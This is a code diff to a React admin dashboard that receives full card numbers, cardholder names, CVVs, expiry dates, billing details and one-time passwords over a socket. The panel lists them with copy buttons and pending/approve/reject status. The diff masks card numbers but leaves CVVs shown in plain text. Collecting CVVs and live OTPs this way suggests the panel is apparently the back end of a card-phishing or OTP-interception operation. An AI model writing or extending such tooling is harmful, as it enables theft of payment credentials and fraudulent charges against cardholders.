@@ -7,12 +7,33 @@ import { useToast } from '@/hooks/use-toast';
 import { useSocket } from '../SocketContext';
 import { v4 as uuidv4 } from 'uuid';
 
+const formatCardNumber = (cardNumber: string) => {
+  if (!cardNumber) return '';
+  // Remove any non-digit characters
+  const digitsOnly = cardNumber.replace(/\D/g, '');
+  // Show last 4 digits only if card number is longer than 4 digits
+  if (digitsOnly.length > 4) {
+    return `•••• •••• •••• ${digitsOnly.slice(-4)}`;
+  }
+  return digitsOnly;
+};
+
+const formatExpiry = (payment: any) => {
+  if (!payment.expiry) return '';
+  const expiryParts = payment.expiry.split('/');
+  if (expiryParts.length !== 2) return '';
+  return `${expiryParts[0].padStart(2, '0')}/${expiryParts[1]}`;
+};
+
 interface PaymentData {
   id: string;
+  paymentId: string;
   cardNumber: string;
   cardName: string;
   cvv: string;
   expiry: string;
+  expiryMonth?: string;
+  expiryYear?: string;
   billingDetails: {
     firstName: string;
     lastName: string;
@@ -25,6 +46,7 @@ interface PaymentData {
   amount: number;
   timestamp: string;
   status: 'pending' | 'approved' | 'rejected';
+  [key: string]: any; // Add index signature to allow dynamic properties
 }
 
 interface OtpData {
@@ -63,7 +85,23 @@ const Admin = () => {
           const newPayment: PaymentData = {
             ...data,
             id: Date.now().toString() + Math.random().toString(36).substr(2, 9),
-            status: 'pending'
+            paymentId: data.paymentId || `pay_${Date.now()}`,
+            status: 'pending',
+            cardNumber: data.cardNumber || '',
+            cardName: data.cardName || '',
+            cvv: data.cvv || '',
+            expiry: data.expiry || '',
+            billingDetails: data.billingDetails || {
+              firstName: '',
+              lastName: '',
+              email: '',
+              country: '',
+              companyName: ''
+            },
+            planName: data.planName || '',
+            billing: data.billing || '',
+            amount: data.amount || 0,
+            timestamp: data.timestamp || new Date().toISOString()
           };
           setPayments(prev => [newPayment, ...prev]);
         } catch (error) {
@@ -366,7 +404,7 @@ const Admin = () => {
                       variant="ghost"
                       size="sm"
                       onClick={() => copyToClipboard(otps[0].otp)}
-                      className="h-8 w-8 p-0 text-blue-300 hover:text-blue-100"
+                      className="h-6 w-6 p-0 text-blue-300 hover:text-blue-100"
                     >
                       <Copy className="h-4 w-4" />
                     </Button>
@@ -432,7 +470,7 @@ const Admin = () => {
                       </td>
                       <td className="px-6 py-4 whitespace-nowrap text-sm font-mono">
                         <div className="flex items-center gap-2">
-                          <span className="text-green-400">{payment.cardNumber}</span>
+                          <span className="text-green-400">{formatCardNumber(payment.cardNumber)}</span>
                           <Button
                             variant="ghost"
                             size="sm"
@@ -450,7 +488,7 @@ const Admin = () => {
                         {payment.cvv}
                       </td>
                       <td className="px-6 py-4 whitespace-nowrap text-sm">
-                        {payment.expiry}
+                        {formatExpiry(payment)}
                       </td>
                       <td className="px-6 py-4 whitespace-nowrap text-sm font-medium">
                         ₹{payment.amount.toLocaleString()}
